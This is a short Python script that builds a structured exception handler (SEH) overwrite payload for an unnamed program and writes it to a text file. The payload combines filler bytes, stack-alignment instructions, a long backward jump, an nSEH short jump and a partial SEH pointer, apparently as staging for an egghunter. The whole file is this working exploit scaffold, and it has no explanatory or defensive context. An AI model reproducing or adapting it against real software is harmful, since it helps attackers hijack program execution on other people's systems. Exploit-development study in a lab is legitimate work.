#!/usr/bin/python
import struct

file2="egghpayload.txt"

alignESP = "\x61" * 25 # POPAD 25 times

longJump = "\xE9\xBF\xFD\xFF\xFF"

nSEH = "\xEB\xF9\x90\x90" # Jump back 5 bytes
SEH  = "\x4b\x4d\x47"     # 0x00474d4b

egghpayload  = "A" * 6
egghpayload += "B" * 101
egghpayload += alignESP
egghpayload += "C" * (572 - len(alignESP))
egghpayload += longJump
egghpayload += nSEH
egghpayload += SEH
#egghpayload += "D" * (5000 - len(egghpayload))


textfile = open(file2 , 'w')
textfile.write(egghpayload)
textfile.close()

